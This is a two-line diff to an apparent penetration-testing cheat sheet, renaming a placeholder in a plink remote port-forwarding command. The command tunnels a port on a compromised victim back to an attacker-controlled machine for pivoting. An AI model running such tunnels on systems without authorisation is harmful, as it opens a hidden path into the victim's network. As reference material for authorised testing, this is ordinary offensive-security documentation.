@@ -2,7 +2,7 @@
 
 #### Plink Remote Port Forwarding ####
 
-```plink -l $user -pw $password $attacking_machine_ip -R $attacker_port:127.0.0.1:$victim_port```
+```plink -l $user -pw $password $attacking_machine_ip -R $attacker_port_to_open:127.0.0.1:$victim_port```
 
 ```$command 127.0.0.1:$attacker_port```
 
